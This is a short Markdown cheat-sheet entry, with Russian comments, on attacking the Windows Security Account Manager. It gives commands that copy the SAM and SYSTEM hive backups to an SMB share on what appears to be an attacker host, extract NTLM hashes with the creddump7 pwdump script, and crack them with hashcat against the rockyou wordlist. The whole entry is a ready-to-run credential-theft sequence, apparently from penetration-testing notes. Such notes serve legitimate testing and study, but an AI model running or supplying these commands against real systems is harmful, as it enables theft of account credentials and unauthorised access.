# Security Account Manager (SAM)

```
# Первый шаг скопировать SAM SYSTEM, можно резервные скопировать
copy C:\Windows\Repair\SAM \\10.10.10.10\kali\
copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\
# Можно использовать  скрипт от Tib3rius для извлечения хэшей
git clone https://github.com/Tib3rius/creddump7
pip3 install pycrypto
python3 creddump7/pwdump.py SYSTEM SAM
# После извлечения можно побрутить хэш
hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
```
